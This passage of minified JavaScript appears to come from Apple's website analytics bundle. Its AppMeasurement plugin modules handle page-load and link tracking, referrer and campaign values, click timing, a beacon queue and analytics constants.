propMatchString="";Array.prototype.forEach.call(arguments,((arg,idx)=>{0!==idx&&(propMatchString+=propMatchString?`|${arg}`:`(${arg}`)})),propMatchString+=")(\\d+?)?$";return new RegExp(propMatchString)}function getAppMeasurementProperties(am,...args){const propertyRegex=getPropertyRegex.apply(null,arguments),keys=[];for(const key in am)propertyRegex.test(key)&&keys.push(key);return keys}module.exports={isMicroEvent:isMicroEvent,isPageLoad:isPageLoad,isExitLink:function isExitLink(am){return"e"===am.linkType},isTracking:function isTracking(am){return isPageLoad(am)||isMicroEvent(am)},appendList:function appendList(am,str,data,separator=",",caseSensitive=1){"string"==typeof data&&(data=[data]),"string"!=typeof am[str]&&(am[str]=JSON.stringify(am[str])),data.forEach((val=>{am[str]=am.apl(am[str],val,separator,caseSensitive)}))},getReferrer:function getReferrer(){return get([dataLayerConfig.key,dataLayerConfig.keys.referrer])||document.referrer||""},setReferrer:function setReferrer(val){set([dataLayerConfig.key,dataLayerConfig.keys.referrer],val)},isOutgoingLink:function isOutgoingLink(am){return!isIntraPageLink(am.linkObject)},sanitizeProperties:function sanitizeProperties(am,matchRegex,propertiesString){let properties=propertiesString.split(",");properties.unshift(am),properties=getAppMeasurementProperties.apply(null,properties),properties.forEach((property=>{am[property]=am[property].replace(matchRegex," ")}))}}},{"../../constants":359,"../../helpers/DOM":361,"@apple/analytics-data-layer":46}],324:[function(require,module,exports){const{isPageLoad:isPageLoad}=require("../helpers"),get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../../../constants").dataLayer.configuration;module.exports=function acAnalyticsVersion(am){if(!isPageLoad(am))return;const version=get([dataLayerConfig.key,dataLayerConfig.keys.acAnalyticsVersion]);version&&(am.server=`ac-${version}`)}},{"../../../constants":359,"../helpers":323,"@apple/analytics-data-layer":46}],325:[function(require,module,exports){const{isPageLoad:isPageLoad}=require("../helpers");module.exports=function afid(am){if(!isPageLoad(am))return;const data=am.getQueryParam("afid");data&&(am.eVar10=am.getValOnce(data,"s_afc"))}},{"../helpers":323}],326:[function(require,module,exports){const{isPageLoad:isPageLoad,isMicroEvent:isMicroEvent,appendList:appendList}=require("../helpers");module.exports=function asPvi(am){if(isPageLoad(am)){const cookieValue=am.Util.cookieRead("as_pvi");cookieValue&&(am.prop51=cookieValue)}else isMicroEvent(am)&&am.prop51&&appendList(am,"linkTrackVars","prop51")}},{"../helpers":323}],327:[function(require,module,exports){const{isTracking:isTracking,isMicroEvent:isMicroEvent,appendList:appendList}=require("../helpers");module.exports=function asTex(am){isTracking(am)&&(am.list3="D=as_tex",isMicroEvent(am)&&appendList(am,"linkTrackVars","list3"))}},{"../helpers":323}],328:[function(require,module,exports){const{isPageLoad:isPageLoad,isMicroEvent:isMicroEvent,appendList:appendList}=require("../helpers");module.exports=function beaconType(am){isPageLoad(am)?am.eVar97="s.t-p":isMicroEvent(am)&&(am.eVar97=`s.tl-${am.linkType}`,appendList(am,"linkTrackVars","eVar97"))}},{"../helpers":323}],329:[function(require,module,exports){module.exports=function clearLinkTracksAfterDownloadAndExit(am){"d"!==am.linkType&&"e"!==am.linkType||(am.bodyClickFunction=function(am){am.linkTrackVars="",am.linkTrackEvents=""}.bind(null,am))}},{}],330:[function(require,module,exports){const utils=require("@apple/analytics-utils"),mergeIntoDeferredBeacon=require("../../../helpers/mergeIntoDeferredBeacon"),beaconHelpers=utils.beaconHelpers,toStr=utils.toStr,isOutgoingLink=require("../helpers").isOutgoingLink,get=require("@apple/analytics-data-layer").get,set=require("@apple/analytics-data-layer").set,dataLayerKeys=require("../../../constants").dataLayer,confKey=dataLayerKeys.configuration.key,confKeys=dataLayerKeys.configuration.keys,clickCount=[confKey,confKeys.clickTimerCount],linkInteraction=[confKey,confKeys.clickTimerLinkInteraction],loadTiming=[confKey,confKeys.loadTiming],COUNT_PROP="eVar93",TIME_PROP="eVar94",TIME_EVENT="event210",TIME_EVENT_COUNTER="event246",INVALID_EVENT="event242",CLICK_TIME_THRESHOLD=900;function _track(am){if(!am.tcall){_incrementClickTimer();const data=_createDataObject();set(linkInteraction,!1),data&&function _applyData(am,data){data[COUNT_PROP]&&(am[COUNT_PROP]=data[COUNT_PROP]);data[TIME_PROP]&&(am[TIME_PROP]=data[TIME_PROP]);data.events&&function _applyEventsData(am,events){if("string"!=typeof am.events&&void 0!==am.events)return;events.forEach((function(event){-1===event.indexOf("=")?function _applyEventCounter(am,event){if(!event)return;am.events=am.apl(am.events,event,",",1)}(am,event):function _applyEventWithValue(am,event){if(!event)return;const trackedEventsKeys={},eventName=event.split("=")[0],trackedEvents=am.events.split(",");if(trackedEvents.forEach((function(trackedEvent,index){trackedEventsKeys[trackedEvent.split("=")[0]]=index})),isNaN(trackedEventsKeys[eventName]))return void(am.events=am.apl(am.events,event,",",1));trackedEvents.splice(trackedEventsKeys[eventName],1,event),am.events=trackedEvents.join(",")}(am,event)}))}(am,data.events);am.tcall||(void 0!==data.linkTrackEvents&&data.linkTrackEvents.forEach((function(event){am.linkTrackEvents=am.apl(am.linkTrackEvents,event,",",1)})),void 0!==data.linkTrackVars&&data.linkTrackVars.forEach((function(prop){am.linkTrackVars=am.apl(am.linkTrackVars,prop,",",1)})))}(am,data)}}function _createDataObject(){const time=function _getTimeSinceLoad(){let loadTime=get(loadTiming);if(!loadTime){if(!(window&&window.performance&&window.performance.timing&&window.performance.timing.domInteractive))return null;loadTime=window.performance.timing.domInteractive}let time=((Date.now()-loadTime)/1e3).toFixed(2);if(isNaN(time))return null;if(time=parseFloat(time),time>=CLICK_TIME_THRESHOLD||time<=0)return null;return time}(),data={linkTrackVars:[],linkTrackEvents:[],events:[]};return null!==time?(data.events.push(TIME_EVENT_COUNTER),data.events.push(TIME_EVENT+"="+time),data.linkTrackVars.push(TIME_PROP),data.linkTrackEvents.push(TIME_EVENT,TIME_EVENT_COUNTER),data[TIME_PROP]=time):(data.events.push(INVALID_EVENT),data.linkTrackEvents.push(INVALID_EVENT)),data[COUNT_PROP]=get(clickCount),data.linkTrackVars.push(COUNT_PROP),data.linkTrackVars.push("events"),data}function _incrementClickTimer(){let count=get(clickCount);count?count++:count=1,set(clickCount,count)}module.exports=function trackClickTime(am){if(!am.linkName||-1===am.linkName.indexOf("v@e")&&-1===am.linkName.indexOf("v@sk")&&-1===am.linkName.indexOf("v@m"))if(am.tcall)_track(am);else if(isOutgoingLink(am)&&"e"!==am.linkType&&"d"!==am.linkType)(function _storeData(am){_incrementClickTimer();const legacyData=_createDataObject(),newData={};newData.events=JSON.parse(JSON.stringify(legacyData.events)),newData.events=newData.events.join(","),newData[COUNT_PROP]=legacyData[COUNT_PROP],newData[TIME_PROP]=legacyData[TIME_PROP],beaconHelpers.isNotEmpty(newData)&&mergeIntoDeferredBeacon(function _sanitizeBeacon(beacon){return Object.keys(beacon).forEach((function(key){const type=key.substring(0,4),value=toStr(beacon[key]);"prop"===type?beacon[key]=value.substring(0,100):"eVar"===type&&(beacon[key]=value.substring(0,250))})),beacon}(newData))})();else if(get(linkInteraction)&&am.linkName)_track(am);else if(am.linkObject){if("d"===am.linkType||"e"===am.linkType)return void _track(am);set(linkInteraction,!0)}}},{"../../../constants":359,"../../../helpers/mergeIntoDeferredBeacon":376,"../helpers":323,"@apple/analytics-data-layer":46,"@apple/analytics-utils":190}],331:[function(require,module,exports){const appendList=require("../helpers").appendList,get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../../../constants").dataLayer.configuration;module.exports=function contactRetail(am){if("e"===am.linkType&&"contactretail"===am.linkName){let region="none";am.ActivityMap&&am.ActivityMap.region&&am.linkObject&&(region=am.ActivityMap.region(am.linkObject));const pageName=get([dataLayerConfig.key,dataLayerConfig.keys.computedPageName])||"none";am.prop41=`open | apple chat | ${region} | ${pageName}`,appendList(am,"linkTrackVars","prop41")}}},{"../../../constants":359,"../helpers":323,"@apple/analytics-data-layer":46}],332:[function(require,module,exports){const appendList=require("../helpers").appendList;module.exports=function enhanceDownloadLinks(am){"d"===am.linkType&&am.linkURL&&(am.linkURL.match(/\.rss|\.xml/)?am.eVar16=am.prop16="sign ups":(am.eVar16=am.prop16="downloads",appendList(am,"events","event5"),appendList(am,"linkTrackVars","events"),appendList(am,"linkTrackEvents","event5")),appendList(am,"linkTrackVars",["eVar16","prop16"]))}},{"../helpers":323}],333:[function(require,module,exports){const{isPageLoad:isPageLoad,setReferrer:setReferrer}=require("../helpers"),regexPattern=/OAS-.+?-DOMAINS-/i;module.exports=function externalCampaign(am){isPageLoad(am)&&(am.campaign||(am.campaign=am.getQueryParam("cid"),am.campaign.match(regexPattern)&&setReferrer("http://"+am.campaign.replace(regexPattern,""))),am.campaign=am.getValOnce(am.campaign,"s_campaign",0))}},{"../helpers":323}],334:[function(require,module,exports){const isPageLoad=require("../helpers").isPageLoad,get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../../../constants").dataLayer.configuration;module.exports=function feedbackPage(am){const pageName=get([dataLayerConfig.key,dataLayerConfig.keys.pageName]);isPageLoad&&pageName.match(/feedback - thank you/)&&(am.prop16=am.eVar16="feedback")}},{"../../../constants":359,"../helpers":323,"@apple/analytics-data-layer":46}],335:[function(require,module,exports){const{isPageLoad:isPageLoad,appendList:appendList}=require("../helpers"),get=require("@apple/analytics-data-layer").get,set=require("@apple/analytics-data-layer").set,dataLayerConfig=require("../../../constants").dataLayer.configuration,parseFromDataAttribute=require("../../../helpers/parseFromDataAttribute"),{isOutgoingLink:isOutgoingLink}=require("../helpers"),passiveTrackerInput=require("../../../passiveTracker");module.exports=function handleLink(am){!isPageLoad(am)&&am.linkObject&&"A"===am.linkObject.tagName&&(!function cancelFalseExitLink(am){"e"!==am.linkType||isOutgoingLink(am)||(am.linkURL="",am.linkType="")}(am),function specialExitLink(am){am.linkHandler(get([dataLayerConfig.key,dataLayerConfig.keys.specialExitLinks]),"e")}(am),function exitLinkAttribute(am){"e"!==am.linkType&&"d"!==am.linkType&&am.linkObject.hasAttribute("data-analytics-exit-link")&&"false"!==am.linkObject.getAttribute("data-analytics-exit-link")&&(am.linkType="e",am.linkName=am.linkObject.getAttribute("data-analytics-exit-link"))}(am),function shoppingBag(am){if(am.linkObject.classList.contains("ac-gn-link-bag")||am.linkObject.classList.contains("globalnav-link-bag")){const pageTitle=get([dataLayerConfig.key,dataLayerConfig.keys.pageName]),linkTitle=am.linkObject.dataset.analyticsTitle;am.linkName=`${pageTitle} - ${linkTitle}`,am.prop3=linkTitle,am.linkType="o",am.bodyClickTarget=am.linkObject,set([dataLayerConfig.key,dataLayerConfig.keys.clickTimerLinkInteraction],!0),am.eVar1=`${am.pageName} | global nav | ${linkTitle}`,appendList(am,"linkTrackVars",["eVar1","prop3"]),am.bodyClickFunction=function(am){am.M=0,am.linkTrackVars="",am.eVar1="",am.prop3=""}.bind(null,am)}}(am),function passiveLink(am){const passiveData=am.linkObject.getAttribute("data-analytics-passive-link");if(passiveData){const trackingData=parseFromDataAttribute(passiveData);trackingData&&passiveTrackerInput(trackingData)}}(am))}},{"../../../constants":359,"../../../helpers/parseFromDataAttribute":379,"../../../passiveTracker":397,"../helpers":323,"@apple/analytics-data-layer":46}],336:[function(require,module,exports){const{isTracking:isTracking,isMicroEvent:isMicroEvent,appendList:appendList}=require("../helpers"),get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../../../constants").dataLayer.configuration;module.exports=function hierarchy1(am){isTracking(am)&&(am.hier1=get([dataLayerConfig.key,dataLayerConfig.keys.computedChannel])||"",am.hier1&&isMicroEvent(am)&&appendList(am,"linkTrackVars","hier1"))}},{"../../../constants":359,"../helpers":323,"@apple/analytics-data-layer":46}],337:[function(require,module,exports){const{isPageLoad:isPageLoad}=require("../helpers");module.exports=function internalCampaign(am){isPageLoad(am)&&(am.eVar7||(am.eVar7=am.getQueryParam("aid")),am.eVar7=am.getValOnce(am.eVar7,"s_var_7",0))}},{"../helpers":323}],338:[function(require,module,exports){const{appendList:appendList,isMicroEvent:isMicroEvent,isPageLoad:isPageLoad}=require("../helpers"),get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../../../constants").dataLayer.configuration;module.exports=function langLocale(am){if(isPageLoad(am)){let docLang=get([dataLayerConfig.key,dataLayerConfig.keys.locale]);docLang||(docLang="n/a"),am.eVar14=docLang}else isMicroEvent(am)&&appendList(am,"linkTrackVars","eVar14")}},{"../../../constants":359,"../helpers":323,"@apple/analytics-data-layer":46}],339:[function(require,module,exports){const passiveTracker=require("../../../passiveTracker"),get=require("@apple/analytics-data-layer").get,dataLayerKeys=require("../../../constants").dataLayer,linkInteraction=[dataLayerKeys.configuration.key,dataLayerKeys.configuration.keys.trackingStateLinkInteraction],beacon={events:"event500"};module.exports=function linkMissingTitle(am){get(linkInteraction)&&(am.linkObject.getAttribute("data-analytics-title")||passiveTracker(beacon))}},{"../../../constants":359,"../../../passiveTracker":397,"@apple/analytics-data-layer":46}],340:[function(require,module,exports){const{isTracking:isTracking,sanitizeProperties:sanitizeProperties}=require("../helpers"),propertiesString=require("../../../constants").sanitize.propertiesString,sanitizePattern=require("../../../constants").sanitize.sanitizePattern;module.exports=function manageVars(am){isTracking(am)&&(am.manageVars("lowercaseVars","purchaseID,pageType,events,products,transactionID",2),sanitizeProperties(am,sanitizePattern,propertiesString))}},{"../../../constants":359,"../helpers":323}],341:[function(require,module,exports){const passiveTrackerLoader=require("@apple/analytics-bp-passive-tracker-loader").passiveTrackerLoader,{parseEventCollectionString:parseEventCollectionString}=require("@apple/analytics-omniture-collection"),{isTracking:isTracking,isPageLoad:isPageLoad}=require("../helpers");module.exports=function track(appMeasurementObject){if(!isTracking(appMeasurementObject))return;const data={beacon:appMeasurementObject};isPageLoad(appMeasurementObject)?(data.type="pageLoad",data.beacon.events&&"string"==typeof data.beacon.events&&(data.beacon.events=parseEventCollectionString(data.beacon.events))):data.type="userInteraction",passiveTrackerLoader(data)}},{"../helpers":323,"@apple/analytics-bp-passive-tracker-loader":35,"@apple/analytics-omniture-collection":105}],342:[function(require,module,exports){const{isTracking:isTracking,isMicroEvent:isMicroEvent,appendList:appendList}=require("../helpers");module.exports=function pageName(am){isTracking(am)&&(am.eVar4="D=pageName",isMicroEvent(am)&&appendList(am,"linkTrackVars","eVar4"))}},{"../helpers":323}],343:[function(require,module,exports){const{parseEventCollectionString:parseEventCollectionString}=require("@apple/analytics-omniture-collection"),{merge:merge}=require("@apple/analytics-merge-beacons"),{isMicroEvent:isMicroEvent,isExitLink:isExitLink}=require("../helpers"),filterBeaconsByType=require("../../../helpers/filterBeaconsByType"),getPassiveTrackerData=require("../../../helpers/getPassiveTrackerData"),mergePassiveTrackerData=require("../../../helpers/mergePassiveTrackerData");let am;const remove=require("@apple/analytics-data-layer").remove,passiveTrackerPath=require("../../../constants").dataLayer.paths.passiveTracker;module.exports=function track(appMeasurementObject){let data;if(am=appMeasurementObject,!isMicroEvent(am)||!function isStorageAvailable(type){try{const storage=window[type],testItem="acAnalyticsStorageTestItem";return storage.setItem(testItem,"a"),storage.removeItem(testItem),!0}catch(e){return!1}}("sessionStorage"))return;if(data=getPassiveTrackerData(),!data)return;const type=function trackingType(){if(isMicroEvent(am))return isExitLink(am)?"exit":"micro-event"}();data=filterBeaconsByType(data,type),data.length&&(data=mergePassiveTrackerData(data),data&&function prepareAppMeasurement(data){(function setEventsData(data){if(!data.events)return;const newData={events:parseEventCollectionString(data.events)},currentData={};am.events?currentData.events=parseEventCollectionString(am.events):currentData.events={};const mergedData=merge({target:currentData,source:newData});am.linkTrackEvents=[...mergedData.events.keys()].join(","),am.events=mergedData.events.toString(),am.linkTrackVars=am.apl(am.linkTrackVars,"events",",",1),delete data.events})(data),function setVarData(data){if(0===Object.keys(data))return;Object.keys(data).forEach((prop=>{am[prop]=data[prop],isMicroEvent(am)&&(am.linkTrackVars=am.apl(am.linkTrackVars,prop,",",1))}))}(data),remove(passiveTrackerPath)}(data))}},{"../../../constants":359,"../../../helpers/filterBeaconsByType":367,"../../../helpers/getPassiveTrackerData":370,"../../../helpers/mergePassiveTrackerData":377,"../helpers":323,"@apple/analytics-data-layer":46,"@apple/analytics-merge-beacons":94,"@apple/analytics-omniture-collection":105}],344:[function(require,module,exports){const{isPageLoad:isPageLoad}=require("../helpers");module.exports=function percentPageViewed(am){if(!isPageLoad(am))return;let percentPageViewedData;am.prop17||("function"==typeof am.getPercentPageViewed&&(percentPageViewedData=am.getPercentPageViewed()),percentPageViewedData&&percentPageViewedData.length>=4&&void 0!==percentPageViewedData[1]&&(am.prop17=percentPageViewedData[1]+":"+percentPageViewedData[2],am.prop28=10*Math.round(percentPageViewedData[3]/10)))}},{"../helpers":323}],345:[function(require,module,exports){const{isPageLoad:isPageLoad,isMicroEvent:isMicroEvent,isTracking:isTracking,appendList:appendList,getReferrer:getReferrer}=require("../helpers"),get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../../../constants").dataLayer.configuration;module.exports=function referrerAndCurrentUrl(am){if(isTracking(am)){const calculatedReferrer=getReferrer();if(isPageLoad(am)){const pageUrl=get([dataLayerConfig.key,dataLayerConfig.keys.pageURL]);am.pageURL=pageUrl,am.eVar54="D=g";const cleanPageUrl=get([dataLayerConfig.key,dataLayerConfig.keys.pageURLNoQueryString]);let secondaryCurrentUrl;secondaryCurrentUrl=pageUrl===cleanPageUrl?"D=g":cleanPageUrl,am.prop4=secondaryCurrentUrl,calculatedReferrer&&(am.referrer=calculatedReferrer,am.eVar49="D=r")}isMicroEvent(am)&&(calculatedReferrer&&(am.eVar49=calculatedReferrer),appendList(am,"linkTrackVars",["eVar54","eVar49"]))}}},{"../../../constants":359,"../helpers":323,"@apple/analytics-data-layer":46}],346:[function(require,module,exports){const{isPageLoad:isPageLoad,setReferrer:setReferrer}=require("../helpers");module.exports=function referrerQueryParam(am){if(!isPageLoad(am))return;const refParamValue=am.getQueryParam("ref");refParamValue&&setReferrer(refParamValue)}},{"../helpers":323}],347:[function(require,module,exports){const{isTracking:isTracking}=require("../helpers");module.exports=function removeSpacesInLinkTrackVars(am){isTracking(am)&&am.linkTrackVars&&(am.linkTrackVars=am.linkTrackVars.replace(/ /g,""))}},{"../helpers":323}],348:[function(require,module,exports){const{isPageLoad:isPageLoad,appendList:appendList}=require("../helpers");module.exports=function retailCookies(am){if(!isPageLoad(am))return;(am.Util.cookieRead("rtsid")||am.Util.cookieRead("rtsidInt"))&&appendList(am,"events","event37")}},{"../helpers":323}],349:[function(require,module,exports){module.exports=function setTcallToFalse(am){am.tcall=!1}},{}],350:[function(require,module,exports){const appendList=require("../helpers").appendList;module.exports=function specialRssLinks(am){am.linkHandler("rss~rss.support.apple.com"),am.linkURL&&am.linkURL.includes("/ax.itunes.apple.com/WebObjects/MZStoreServices.woa/ws/RSS/")&&am.linkType&&"e"===am.linkType&&(am.linkName="rss"),"rss"===am.linkName&&(am.eVar16=am.prop16="sign ups",appendList(am,"linkTrackVars",["eVar16","prop16"]))}},{"../helpers":323}],351:[function(require,module,exports){const{isTracking:isTracking}=require("../helpers"),set=require("@apple/analytics-data-layer").set,dataLayerKeys=require("../../../constants").dataLayer,linkInteraction=[dataLayerKeys.configuration.key,dataLayerKeys.configuration.keys.trackingStateLinkInteraction];module.exports={begin:function begin(am){isTracking(am)||am.linkObject&&set(linkInteraction,!0)},end:function end(am){isTracking(am)||set(linkInteraction,!1)}}},{"../../../constants":359,"../helpers":323,"@apple/analytics-data-layer":46}],352:[function(require,module,exports){const{isMicroEvent:isMicroEvent,isTracking:isTracking,appendList:appendList}=require("../helpers");module.exports=function userSignInStatus(am){isTracking(am)&&am.Util.cookieRead("as_cn")&&(appendList(am,"events","event209"),isMicroEvent(am)&&(appendList(am,"linkTrackEvents","event209"),appendList(am,"linkTrackVars","events")))}},{"../helpers":323}],353:[function(require,module,exports){const t=require("./t"),tl=require("./tl");module.exports={t:t,tl:tl}},{"./t":354,"./tl":355}],354:[function(require,module,exports){module.exports=function submit(request,metadata,appMeasurement){"object"==typeof appMeasurement&&"function"==typeof appMeasurement.t&&(appMeasurement.tcall=!0,appMeasurement.t())}},{}],355:[function(require,module,exports){const errorHandler=require("../../ErrorHandler"),moduleName="appMeasurementPluginSubmitMethodtl",DOMHelper=require("../../helpers/DOM");function _isOutgoingLink(element){return!!element&&!0!==DOMHelper.isIntraPageLink(element)}module.exports=function submit(trackingData,metadata,appMeasurement){let linkType,targetEl;if("object"==typeof appMeasurement&&"function"==typeof appMeasurement.tl){if("object"!=typeof trackingData.beacon&&errorHandler.log(moduleName,"submit",`trackingData param data (${trackingData.beacon}) is not an object`),"string"!=typeof trackingData.beacon.title&&errorHandler.log(moduleName,"submit",`trackingData param title (${trackingData.beacon.title}) is not a string`),errorHandler.exception)return;trackingData.linkTrackVars&&trackingData.linkTrackVars.length>0&&(appMeasurement.linkTrackVars=trackingData.linkTrackVars.join(",")),linkType=trackingData.beacon.linkType||"o",targetEl=function _targetEl(element){return!0!==_isOutgoingLink(element)||element}(trackingData.data.targetEl),appMeasurement.forcedLinkTrackingTimeout=function _forcedLinkTrackingTimeout(request){let duration=0;const element=request.data.targetEl;(request.type&&"link"===request.type||"click"===request.type)&&!0===_isOutgoingLink(element)&&(duration=500);return duration}(trackingData),trackingData.options.useBeacon&&(appMeasurement.useBeacon=!0),appMeasurement.tl(targetEl,linkType,trackingData.beacon.title),function _clearTrackingData(appMeasurement){appMeasurement.linkTrackVars="",appMeasurement.linkTrackEvents=""}(appMeasurement)}}},{"../../ErrorHandler":356,"../../helpers/DOM":361}],356:[function(require,module,exports){const log=require("@marcom/ac-console/log"),trace=require("@marcom/ac-console/trace");module.exports=new class ErrorHandler{constructor(){this.exception=!1,this.errors=[]}log(moduleName,methodName,message){const formattedMessage=this._formatMessage(moduleName,methodName,message);this.exception=!0,this.errors.push({instance:moduleName,method:methodName,message:formattedMessage}),log(formattedMessage),trace()}warn(moduleName,methodName,message){const formattedMessage=this._formatMessage(moduleName,methodName,message);log(formattedMessage),trace()}report(index){let out="";return"number"==typeof index&&this.errors[index]?(out=this.errors[index].message,log(this.errors[index].message)):(this.errors.forEach((function(err){out+=`${err.message} '\r\n`})),log(out)),out}_formatMessage(moduleName,methodName,message){let throwerString="";let throwerSep;return(moduleName||methodName)&&(throwerSep=moduleName&&methodName?".":"",throwerString=(moduleName||"")+throwerSep+(methodName||"")+" : "),"Analytics : "+throwerString+message}bailed(){return this.errors.length>0}}},{"@marcom/ac-console/log":253,"@marcom/ac-console/trace":254}],357:[function(require,module,exports){const jsonEncoder=require("@apple/analytics-utils").jsonEncoder,errorHandler=require("./ErrorHandler"),queueDataLayerKey=require("./constants").dataLayer.paths.queue,get=require("@apple/analytics-data-layer").get,set=require("@apple/analytics-data-layer").set,remove=require("@apple/analytics-data-layer").remove,isStorageAvailable=require("./helpers/isStorageAvailable");module.exports=class Queue{constructor(){this._arr=[],this._length=0}add(item){item||errorHandler.log("Queue","add",item+" is not a valid object"),errorHandler.exception||(this._arr.push(item),this._updateQueueSize())}remove(){this.size()>0&&(this._arr.shift(),this._updateQueueSize())}reset(){this._arr=[],this._length=0}peek(){if(this.size()>0)return this._arr[0]}isEmpty(){return 0===this.size()}size(){return this._length}load(){let data=get(queueDataLayerKey);data=jsonEncoder.decode(data),data&&data&&Array.isArray(data)&&(this._arr=data,remove(queueDataLayerKey),this._updateQueueSize())}save(){set(queueDataLayerKey,jsonEncoder.encode(this._arr)),this.reset()}collect(){let analyticsQueue=this._arr;const analyticsData=jsonEncoder.decode(get(queueDataLayerKey));Array.isArray(analyticsData)&&(analyticsQueue=analyticsData.concat(analyticsQueue)),set(queueDataLayerKey,jsonEncoder.encode(analyticsQueue)),this.reset()}canSave(){return isStorageAvailable()}_updateQueueSize(){this._length=this._arr.length}}},{"./ErrorHandler":356,"./constants":359,"./helpers/isStorageAvailable":375,"@apple/analytics-data-layer":46,"@apple/analytics-utils":190}],358:[function(require,module,exports){const Queue=require("./Queue"),AppMeasurement=require("./Appmeasurement/AppMeasurement"),passiveTracker=require("./passiveTracker"),errorHandler=require("./ErrorHandler"),templateVarHelper=require("./helpers/templateVar"),isEmptyObj=require("./helpers/isEmptyObj"),trackerRegistry=require("./trackers/TrackerRegistry"),mergeIntoDeferredBeacon=require("./helpers/mergeIntoDeferredBeacon");trackerRegistry.registerAllTrackers();module.exports=new class Tracker{constructor(){this.AppMeasurement=new AppMeasurement,this.paused=!1,this._queue=new Queue,this.trackGeneric=this.trackGeneric.bind(this),this.resume()}track(data){if(data&&"object"==typeof data&&data.type||errorHandler.log("Tracker","track",data+" is not a valid request object"),errorHandler.exception)return;const templateVarArr=templateVarHelper.set();if("page"===data.type?(data.submitMethod="t",data.beacon=JSON.parse(JSON.stringify(data.data))):(data.submitMethod="tl",data.beacon={}),trackerRegistry.processBeaconByType(data.type,data),!isEmptyObj(data.beacon)){for(const prop in data.beacon)"string"==typeof data.beacon[prop]&&(data.beacon[prop]=templateVarHelper.translate(data.beacon[prop],templateVarArr));return data.options.deferred?(data.beacon.title&&delete data.beacon.title,void mergeIntoDeferredBeacon(data.beacon)):data.options.usePassiveTracker?(delete data.beacon.title,void passiveTracker(data.beacon)):void(!0!==data.options.silent&&(this._queue.add(data),!0!==this.paused?this._run():this._queue.collect()))}}isPaused(){return this.paused}resume(){this._queue.load();0!==this._queue.size()&&(this.paused=!1,this._run())}_run(){let promise;if(0===this._queue.size())return;const options=this._queue.peek().options||{};void 0===options.async&&(options.async=!0),promise=!1===options.async?this.sync(this.send.bind(this)):this.async(this.send.bind(this)),promise.then(function(){!this.paused&&this._queue.size()>0&&this._run()}.bind(this))}send(){if("function"!=typeof this.AppMeasurement.submit&&errorHandler.log("Tracker","send","provided plugin does not contain a valid submit method"),errorHandler.exception)return;if(0===this._queue.size())return;const request=this._queue.peek();this.AppMeasurement.submit(request),this._queue.remove()}pause(){!0!==this.paused&&this.canPause()&&(this._queue.size()>0&&this._queue.save(),this.paused=!0)}canPause(){return this._queue.canSave()}async(callback){if(callback&&"function"==typeof callback||errorHandler.log("Tracker","async",'Provided callback "'+callback+'" is not a function'),!errorHandler.exception)return new Promise((function(resolve){setTimeout((function(){callback(),resolve()}),0)}))}sync(callback){if(callback&&"function"==typeof callback||errorHandler.log("Tracker","sync",'Provided callback "'+callback+'" is not a function'),!errorHandler.exception)return new Promise((function(resolve){callback(),resolve()}))}trackGeneric(data,options){const request={data:data,type:"custom",options:options||{}};this.track(request)}}},{"./Appmeasurement/AppMeasurement":309,"./ErrorHandler":356,"./Queue":357,"./helpers/isEmptyObj":371,"./helpers/mergeIntoDeferredBeacon":376,"./helpers/templateVar":383,"./passiveTracker":397,"./trackers/TrackerRegistry":398}],359:[function(require,module,exports){const dataLayerKeys=require("@apple/analytics-data-layer").KEYS,constants={acAnalyticsVersion:"2.20.0",sessionStorage:"sessionStorage",primaryDomain:"apple.com",domainRegex:/apple.com.cn$/,performanceTimingEvents:"event220,event221,event222,event223,event224,event225,event226,event227,event228,event229,event230,event231,event232",dataLayer:{meta:{key:dataLayerKeys.METADATA,keys:{"s-bucket-0":"s-bucket-0","s-bucket-1":"s-bucket-1","s-bucket-2":"s-bucket-2","s-campaign":"s-campaign","s-channel":"s-channel","s-page-tracking-data":"s-page-tracking-data",track:"track"},selector:'meta[property^="analytics-"]',keyAttribute:"property",valueAttribute:"content",keyPrefix:"analytics-"},paths:{deferred:[dataLayerKeys.PERSISTED,dataLayerKeys.DEFERRED_BEACON],passiveTracker:["passiveTracker"],queue:[dataLayerKeys.PERSISTED,"acAnalyticsQueue"],performancePage:[dataLayerKeys.SESSION_STORE,"performanceTimingPage"],performanceAssets:[dataLayerKeys.SESSION_STORE,"performanceTimingAssets"]},deferred:{key:dataLayerKeys.DEFERRED_BEACON},pageDataModel:{key:dataLayerKeys.PAGE_DATA_MODEL,selector:"script#metrics"},persisted:{key:dataLayerKeys.PERSISTED},sessionStore:{key:dataLayerKeys.SESSION_STORE},configuration:{key:"conf",optionsKey:"conf.options",keys:{acAnalyticsVersion:"acAnalyticsVersion",bucket:"bucket",bucket0:"bucket0",bucket1:"bucket1",bucket2:"bucket2",bucketstore:"bucketstore",campaign:"campaign",channel:"channel",clickTimerCount:"clickTimerCount",clickTimerLinkInteraction:"clickTimerLinkInteraction",computedCampaign:"computedCampaign",computedChannel:"computedChannel",computedPageName:"computedPageName",computedProductName:"computedProductName",cookieLifetime:"cookieLifetime",countryBuckets:"countryBuckets",countryCodeFilter:"countryCodeFilter",currencyCode:"currencyCode",initialTimeStamp:"initialTimeStamp",legacyCountryCode:"legacyCountryCode",linkDownloadFileTypes:"linkDownloadFileTypes",loadTiming:"loadTiming",locale:"locale",pageName:"pageName",pageTrackingData:"pageTrackingData",pageType:"pageType",pageURL:"pageURL",pageURLNoQueryString:"pageURLNoQueryString",platform:"platform",productName:"productName",queryString:"queryString",referrer:"referrer",searchTerm:"searchTerm",specialExitLinks:"specialExitLinks",subdomains:"subdomains",subdomainSupportedDomains:"subdomainSupportedDomains",track:"track",trackingDomain:"trackingDomain",trackingServer:"trackingServer",trackingServerSecure:"trackingServerSecure",trackingStateLinkInteraction:"trackingStateLinkInteraction"}}},countryBuckets:["us","au|ca|cn|de|es|fr|it|jp|uk","ap|at|bf|bl|br|ce|cr|dk|fi|hk|ie|in|kr|la|mx|nl|no|nz|pl|pt|ru|se|sg|th|tw|za"],subdomains:["www","images","movies","ssl","search","smb","nova","experience","partner-relay"],supportedSubdomains:["apple.com","apple.com.cn"],cookieLifetime:"1800",linkDownloadFileTypes:["ical","ics","zip","wav","mp3","doc","pdf","xls","dmg","sit","pkg","exe","m4a","rss","xml","extz","safariextz","ibooks","epub","pages","numbers","key","xlsx","pptx","docx","psd","aif"],sanitize:{propertiesString:"prop,eVar",sanitizePattern:/(\n|\t|\r|